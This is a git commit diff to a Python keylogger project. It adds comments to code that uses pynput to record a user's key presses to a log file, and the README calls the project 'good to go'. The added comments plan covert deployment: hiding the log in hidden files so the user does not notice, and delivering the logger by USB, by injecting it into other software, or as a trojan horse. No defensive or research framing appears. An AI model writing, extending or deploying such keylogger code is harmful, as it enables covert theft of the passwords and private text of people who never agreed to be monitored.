0107b1cf7c61a9f4c6fe298efe6b8ae6a31f9719
cyberprofali <aliev.mordecai@gmail.com>
2026-02-20 18:06:11 -0600

    Adding comments

--- Main.py
+++ Main.py
@@ -4,6 +4,9 @@
 import pynput
 from pynput import keyboard
 
+# How do you make sure the user doesn't see this? ** Hidden files **
+# Also this doesn't gurantee that there is a log.txt
+# Figure out how to get special characters
 #Function to log key presses
 def Keypress(key):
     print(str(key))
@@ -12,9 +15,11 @@ def Keypress(key):
             char = key.char
             logKey.write(char)
         except:
-            print("Error logging key")   #If this is shown, it means the key is not a character (space, enter, etc.)
+            print("Error logging key")   # If this is shown, it means the key is not a character (space, enter, etc.)
 
-#Main function (Used to listen)        
+# Software or hardware implemented? 
+# USB, inject it into a software, or make trojan horse
+# Main function (Used to listen)        
 if __name__ == "__main__":
     listner = keyboard.Listener(on_press=Keypress)
     listner.start()
--- README.md
+++ README.md
@@ -1,2 +1,5 @@
 # Key-Logger
+
 Key logger to capture a users key strokes
+
+02/20 good to go
